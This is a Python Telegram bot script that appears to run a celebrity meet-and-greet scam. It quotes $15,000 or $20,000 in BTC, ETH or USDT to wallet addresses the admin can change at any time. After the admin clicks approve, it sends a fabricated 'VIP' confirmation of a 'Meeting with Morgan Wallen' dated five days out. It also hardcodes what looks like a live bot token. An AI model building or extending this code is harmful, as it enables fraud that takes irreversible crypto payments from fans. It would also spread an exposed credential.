from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
import sqlite3
from datetime import datetime, timedelta
import os
import threading
from flask import Flask

# ================= RENDER SYSTEM =================
server = Flask(__name__)
@server.route('/')
def health_check(): return "Alive", 200

# ================= SETTINGS =================
TOKEN = "8681446523:AAHs42JckBFG_n-OYsASEbv-6Q4eFUlE5tw"
ADMIN_IDS = [7936558915]

def is_admin(user_id): return user_id in ADMIN_IDS

# ================= DATABASE =================
conn = sqlite3.connect("bot.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS bookings (user_id INTEGER, meeting_type TEXT, reason TEXT, price INTEGER, status TEXT, meeting_date TEXT)")
cursor.execute("CREATE TABLE IF NOT EXISTS wallets (coin TEXT PRIMARY KEY, address TEXT, memo TEXT)")
conn.commit()

def get_wallet(coin):
    cursor.execute("SELECT address, memo FROM wallets WHERE coin=?", (coin,))
    row = cursor.fetchone()
    return row if row else ("NOT SET", None)

# ================= START =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🎯 Book Meeting", callback_data="book")]]
    if is_admin(update.effective_user.id):
        keyboard.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
    await update.message.reply_text("Welcome 👋", reply_markup=InlineKeyboardMarkup(keyboard))

# ================= CALLBACKS =================
async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    # ADMIN PANEL
    if data == "admin_panel" and is_admin(user_id):
        kb = [[InlineKeyboardButton("Edit BTC", callback_data="edit_BTC")],
              [InlineKeyboardButton("Edit ETH", callback_data="edit_ETH")],
              [InlineKeyboardButton("Edit USDT", callback_data="edit_USDT")]]
        await query.edit_message_text("🛠 Admin: Select a wallet to edit/update:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("edit_") and is_admin(user_id):
        coin = data.split("_")[1]
        context.user_data["editing_coin"] = coin
        await query.edit_message_text(f"Updating {coin}...\n\nSend the new address.\nFormat: `Address` or `Address,Memo` (with a comma).")

    # BOOKING LOGIC
    elif data == "book":
        kb = [[InlineKeyboardButton("Meet & Greet ($15k)", callback_data="type_meet")],
              [InlineKeyboardButton("Business ($20k)", callback_data="type_business")]]
        await query.edit_message_text("Choose meeting type:", reply_markup=InlineKeyboardMarkup(kb))

    elif data in ["type_meet", "type_business"]:
        context.user_data["meeting_type"] = "Meet & Greet" if data == "type_meet" else "Business"
        context.user_data["step"] = "reason"
        await query.edit_message_text("Send your reason for the meeting:")

    # PAYMENT GUIDE
    elif data.startswith("guide_"):
        coin = data.split("_")[1]
        guide = f"📘 {coin} Guide\n\n1️⃣ Open Wallet\n2️⃣ Select {coin}\n3️⃣ Paste Address\n4️⃣ Confirm exact amount.\n\nEnsure network matches!"
        await query.message.reply_text(guide)

    # INVOICE & WALLET DISPLAY
    elif data.startswith("pay_"):
        coin = data.split("_")[1]
        m_type = context.user_data.get("meeting_type", "Meet & Greet")
        price = 15000 if m_type == "Meet & Greet" else 20000
        addr, memo = get_wallet(coin)
        memo_text = f"\n📝 Memo/Tag: {memo}" if memo else ""
        
        kb = [[InlineKeyboardButton("📘 Payment Guide", callback_data=f"guide_{coin}")],
              [InlineKeyboardButton("✅ Confirm Payment", callback_data="confirm_payment")]]
        
        await query.message.reply_text(f"🧾 Invoice\nType: {m_type}\nAmount: ${price}\nCoin: {coin}\n\n📍 Address: {addr}{memo_text}", 
            reply_markup=InlineKeyboardMarkup(kb))

    elif data == "confirm_payment":
        m_type = context.user_data.get("meeting_type", "Meet & Greet")
        for admin in ADMIN_IDS:
            await context.bot.send_message(chat_id=admin, text=f"🧾 Payment Alert: {user_id}\nType: {m_type}", 
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}")]]))
        await query.edit_message_text("⏳ Awaiting admin approval...")

    # APPROVAL SYSTEM
    elif data.startswith("approve_") and is_admin(user_id):
        target = int(data.split("_")[1])
        date = (datetime.now() + timedelta(days=5)).strftime('%Y-%m-%d %H:%M')
        await context.bot.send_message(chat_id=target, text=(
            "🎉 Payment Confirmed Successfully\n\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "👑 VIP CONFIRMATION NOTICE\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "Dear User, your payment has been verified.\n"
            f"📅 Meeting with Morgan Wallen: {date}\n\n"
            "🎫 A VIP Fan Recognition Card will be shipped within 2 days.\n"
            "Status: CONFIRMED ✅"
        ))
        await query.edit_message_text("✅ Approved")

# ================= TEXT HANDLER =================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if is_admin(user_id) and context.user_data.get("editing_coin"):
        coin = context.user_data["editing_coin"]
        parts = text.split(",")
        addr = parts[0].strip()
        memo = parts[1].strip() if len(parts) > 1 else None
        cursor.execute("INSERT OR REPLACE INTO wallets (coin, address, memo) VALUES (?, ?, ?)", (coin, addr, memo))
        conn.commit()
        context.user_data["editing_coin"] = None
        await update.message.reply_text(f"✅ {coin} Updated!\nAddr: {addr}\nMemo: {memo if memo else 'None'}")

    elif context.user_data.get("step") == "reason":
        context.user_data["step"] = None
        kb = [[InlineKeyboardButton("BTC", callback_data="pay_BTC")], 
              [InlineKeyboardButton("ETH", callback_data="pay_ETH")], 
              [InlineKeyboardButton("USDT", callback_data="pay_USDT")]]
        await update.message.reply_text("Choose payment method:", reply_markup=InlineKeyboardMarkup(kb))

# ================= RUN =================
if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    def run_f(): server.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
    threading.Thread(target=run_f, daemon=True).start()
    app.run_polling(drop_pending_updates=True)
